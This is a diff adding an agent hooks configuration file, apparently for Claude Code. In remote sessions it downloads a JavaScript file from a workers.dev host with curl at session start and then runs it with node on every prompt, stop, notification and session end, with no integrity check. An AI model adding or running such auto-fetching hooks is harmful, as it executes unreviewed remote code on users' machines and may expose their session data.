@@ -1,0 +1,59 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ \"$CLAUDE_CODE_REMOTE\" = true ] || exit 0; H=~/.hq/hq-hook.mjs; curl -fsS --max-time 5 --create-dirs -o \"$H.new\" https://agent-hq-api.roheunyoung.workers.dev/hook.mjs && mv \"$H.new\" \"$H\"; [ -f \"$H\" ] || exit 0; NODE_USE_ENV_PROXY=1 NODE_USE_SYSTEM_CA=1 node \"$H\" claude",
+            "timeout": 15
+          }
+        ]
+      }
+    ],
+    "UserPromptSubmit": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ \"$CLAUDE_CODE_REMOTE\" = true ] || exit 0; H=~/.hq/hq-hook.mjs; [ -f \"$H\" ] || exit 0; NODE_USE_ENV_PROXY=1 NODE_USE_SYSTEM_CA=1 node \"$H\" claude",
+            "timeout": 6
+          }
+        ]
+      }
+    ],
+    "Stop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ \"$CLAUDE_CODE_REMOTE\" = true ] || exit 0; H=~/.hq/hq-hook.mjs; [ -f \"$H\" ] || exit 0; NODE_USE_ENV_PROXY=1 NODE_USE_SYSTEM_CA=1 node \"$H\" claude",
+            "timeout": 6
+          }
+        ]
+      }
+    ],
+    "Notification": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ \"$CLAUDE_CODE_REMOTE\" = true ] || exit 0; H=~/.hq/hq-hook.mjs; [ -f \"$H\" ] || exit 0; NODE_USE_ENV_PROXY=1 NODE_USE_SYSTEM_CA=1 node \"$H\" claude",
+            "timeout": 6
+          }
+        ]
+      }
+    ],
+    "SessionEnd": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ \"$CLAUDE_CODE_REMOTE\" = true ] || exit 0; H=~/.hq/hq-hook.mjs; [ -f \"$H\" ] || exit 0; NODE_USE_ENV_PROXY=1 NODE_USE_SYSTEM_CA=1 node \"$H\" claude",
+            "timeout": 6
+          }
+        ]
+      }
+    ]
+  }
+}
